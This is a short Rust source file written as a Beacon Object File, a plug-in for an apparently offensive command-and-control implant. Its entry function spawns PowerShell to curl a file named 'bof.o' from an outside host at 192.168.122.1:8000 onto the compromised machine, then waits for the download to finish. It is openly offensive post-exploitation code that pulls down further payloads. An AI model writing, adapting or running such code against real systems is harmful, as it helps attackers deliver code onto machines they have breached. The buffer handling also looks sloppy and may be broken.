#![allow(non_upper_case_globals)]
use utils::{output, to_wide};
use winapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFO, WaitForSingleObject};
extern crate alloc;
use self::alloc::vec;
use core::alloc::Layout;
use core::ffi::{c_char, c_int};
#[unsafe(no_mangle)]
pub unsafe extern "C" fn rust_bof(args: *mut c_char, _alen: c_int) {
    let mut si = STARTUPINFO::default();
    si.dwFlags = 0x1;
    let mut pi = PROCESS_INFORMATION::default();

    let mut dst_buffer = vec![0 as *mut u16; 100];

    let cmd = "powershell.exe -c curl -o bof.o http://192.168.122.1:8000/wassssssup";
    if !to_wide(cmd, dst_buffer.as_ptr() as *mut u16) {
        output("Could not parse to wide str")
    };
    if (CreateProcessW)(
        core::ptr::null(),
        dst_buffer.as_ptr() as *mut u16,
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        0,
        0,
        core::ptr::null_mut(),
        core::ptr::null(),
        &mut si,
        &mut pi,
    ) == 0
    {
        output("SHIT");
    };

    WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);
}
